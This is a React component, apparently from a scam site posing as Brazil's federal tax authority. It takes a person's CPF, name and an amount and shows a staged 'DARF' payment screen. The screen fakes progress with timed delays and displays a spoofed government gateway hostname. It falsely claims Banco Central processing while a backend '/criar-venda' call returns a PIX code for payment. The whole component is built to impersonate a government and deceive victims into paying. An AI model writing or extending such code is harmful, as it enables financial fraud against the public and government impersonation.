import { useEffect, useState, useRef } from "react";
import { CreditCard, Shield, Lock, CheckCircle, Banknote, QrCode } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface PixLoadingScreenProps {
  cpf: string;
  nome: string;
  valor: number;
  onComplete: (pixCopiaCola: string) => void;
  onError: () => void;
  onTabChange?: (tab: "inicio" | "consultas" | "seguranca" | "ajuda") => void;
}

const steps = [
  { icon: Lock, title: "Autenticação", subtitle: "Sessão segura" },
  { icon: Banknote, title: "Processamento", subtitle: "Cobrança fiscal" },
  { icon: QrCode, title: "PIX", subtitle: "Código de pagamento" },
  { icon: CheckCircle, title: "Finalização", subtitle: "Validando" },
];

const formatCurrency = (value: number) =>
  value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixLoadingScreen = ({ cpf, nome, valor, onComplete, onError, onTabChange }: PixLoadingScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState("Iniciando geração do pagamento...");
  const hasStarted = useRef(false);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    const progressInterval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) return 100;
        return Math.min(p + Math.random() * 1.5 + 0.3, 100);
      });
    }, 250);

    const timers = [
      setTimeout(() => { setActiveStep(1); setStatusText("Processando cobrança fiscal..."); }, 2000),
      setTimeout(() => { setActiveStep(2); setStatusText("Gerando código PIX via Banco Central..."); }, 4500),
      setTimeout(() => { setActiveStep(3); setStatusText("Finalizando transação segura..."); }, 7000),
    ];

    const generate = async () => {
      const startTime = Date.now();
      const MIN_DURATION = 8000;
      try {
        const res = await supabase.functions.invoke("api-proxy", {
          body: { endpoint: "/criar-venda", cpf, nome, valor },
        });

        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));

        setProgress(100);
        setStatusText("Pagamento gerado com sucesso.");
        await new Promise((r) => setTimeout(r, 800));

        if (res.data?.success && res.data?.pixCopiaCola) {
          onComplete(res.data.pixCopiaCola);
        } else {
          onError();
        }
      } catch {
        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));
        onError();
      }
    };

    setTimeout(() => generate(), 300);

    return () => {
      clearInterval(progressInterval);
      timers.forEach(clearTimeout);
    };
  }, [cpf, nome, valor, onComplete, onError]);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader nome={nome} cpf={cpf} />

      <div className="w-full bg-primary/5 border-b border-border py-1.5 sm:py-2">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-[9px] sm:text-xs text-muted-foreground">
          <div className="flex items-center gap-1.5 sm:gap-2">
            <Lock className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
            <span>Sessão segura • TLS 1.3</span>
          </div>
          <span className="hidden sm:inline">Gateway: pix-prod.receita.fazenda.gov.br</span>
          <span className="sm:hidden">pix-prod</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 py-6 sm:py-10">
        <div className="w-full max-w-lg animate-fade-in-up">
          <div className="text-center mb-4 sm:mb-6">
            <div className="mx-auto mb-3 sm:mb-4 flex h-14 w-14 sm:h-16 sm:w-16 items-center justify-center rounded-2xl gradient-primary shadow-lg">
              <CreditCard className="h-7 w-7 sm:h-8 sm:w-8 text-primary-foreground" />
            </div>
            <h1 className="text-lg sm:text-xl font-extrabold text-foreground">Gerando DARF de Pagamento</h1>
            <p className="mt-1 text-xs sm:text-sm text-muted-foreground">
              Valor: <span className="font-bold text-destructive">{formatCurrency(valor)}</span>
            </p>
          </div>

          {/* Progress */}
          <div className="mx-auto mb-2 max-w-sm">
            <div className="flex items-center justify-between mb-1.5 sm:mb-2">
              <span className="text-[10px] sm:text-xs font-medium text-muted-foreground">Gerando pagamento</span>
              <span className="text-[10px] sm:text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2 sm:h-2.5 overflow-hidden rounded-full bg-secondary">
              <div
                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          <div className="text-center mb-5 sm:mb-8">
            <p className="text-[10px] sm:text-xs text-muted-foreground italic">{statusText}</p>
          </div>

          {/* Steps */}
          <div className="mb-5 sm:mb-8 grid grid-cols-4 gap-1 sm:gap-2">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isActive = i <= activeStep;
              const isCurrent = i === activeStep;
              return (
                <div
                  key={i}
                  className={`rounded-lg sm:rounded-xl border p-2 sm:p-3 text-center transition-all duration-500 ${
                    isCurrent
                      ? "border-primary/40 bg-primary/5 shadow-md"
                      : isActive
                        ? "border-accent/30 bg-card"
                        : "border-transparent bg-card/30"
                  }`}
                >
                  <div className="mb-1 sm:mb-2 flex justify-center">
                    <div className={`flex h-7 w-7 sm:h-9 sm:w-9 items-center justify-center rounded-lg transition-all duration-500 ${
                      isCurrent
                        ? "gradient-primary shadow-sm animate-pulse"
                        : isActive
                          ? "bg-accent/10"
                          : "bg-muted"
                    }`}>
                      <Icon className={`h-3 w-3 sm:h-4 sm:w-4 transition-colors duration-500 ${
                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
                      }`} />
                    </div>
                  </div>
                  <h3 className={`text-[9px] sm:text-xs font-bold transition-colors duration-500 leading-tight ${
                    isActive ? "text-foreground" : "text-muted-foreground/40"
                  }`}>
                    {step.title}
                  </h3>
                  <p className="mt-0.5 text-[8px] sm:text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                </div>
              );
            })}
          </div>

          <div className="rounded-xl sm:rounded-2xl border border-border bg-card p-3 sm:p-4 shadow-sm">
            <div className="flex items-start gap-2 sm:gap-3">
              <div className="flex h-8 w-8 sm:h-9 sm:w-9 shrink-0 items-center justify-center rounded-lg sm:rounded-xl bg-accent/10">
                <Shield className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-accent" />
              </div>
              <div>
                <h4 className="font-bold text-foreground text-xs sm:text-sm">Transação Protegida</h4>
                <p className="mt-0.5 text-[10px] sm:text-xs text-muted-foreground leading-relaxed">
                  Pagamento processado via Banco Central do Brasil. Ambiente certificado e criptografado.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <GovFooter onTabChange={onTabChange} />
    </div>
  );
};

export default PixLoadingScreen;
